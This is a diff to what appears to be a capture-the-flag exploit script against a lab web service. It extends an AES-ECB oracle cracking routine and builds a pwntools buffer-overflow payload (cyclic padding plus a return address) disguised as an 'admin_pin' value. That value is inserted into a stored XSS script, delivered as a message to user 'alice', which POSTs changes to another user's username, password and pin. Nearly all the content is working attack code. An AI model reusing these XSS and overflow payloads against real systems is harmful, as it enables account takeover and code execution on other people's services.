@@ -62,7 +62,7 @@ def crack_aes_ecb(encrypt_oracle, known_cleartext=b"", block_size=16, charset=No
         import string
 
         # some punctuation is hard to escape
-        charset = string.ascii_letters + string.digits + "-_: {.}"
+        charset = string.ascii_letters + string.digits + "+-_~!?: {,.}[]()"
     charset = [bytes([c]) for c in charset.encode()]
 
     def append_margin(f):
@@ -167,6 +167,11 @@ def reveal_sharon_username():
 def change_username(old_name: str):
     session = login_as("mallory")
     password = "password"
+    payload: bytes = pwn.cyclic(0x58) + pwn.p64(0x401256) + b"00000000"
+    admin_pin: str = payload.decode("utf-8")
+    admin_pin = admin_pin.replace("\x12", "\\x12")
+    admin_pin = admin_pin.replace("\x00", "\\x00")
+
     while True:
         new_name = yield
         xss_old_name = urllib.parse.quote(old_name)
@@ -174,9 +179,10 @@ def change_username(old_name: str):
         xss_payload = f"""
 <script>(() => {{
 const send = (url, obj) => fetch(url, {{method:'POST', body: new URLSearchParams(obj)}});
-send('/user/{xss_old_name}/modify', {{'username': '{xss_new_name}', 'password': '{password}'}});
+send('/user/{xss_old_name}/modify', {{'username': '{xss_new_name}', 'password': '{password}', 'admin_pin': '{admin_pin}'}});
 }})();</script>
 """
+        # pwn.info(xss_payload)
         # pwn.info(f"Changing {old_name} to {new_name} via XSS")
         send_message(session, "alice", xss_payload)
         while not check_password(new_name, password):
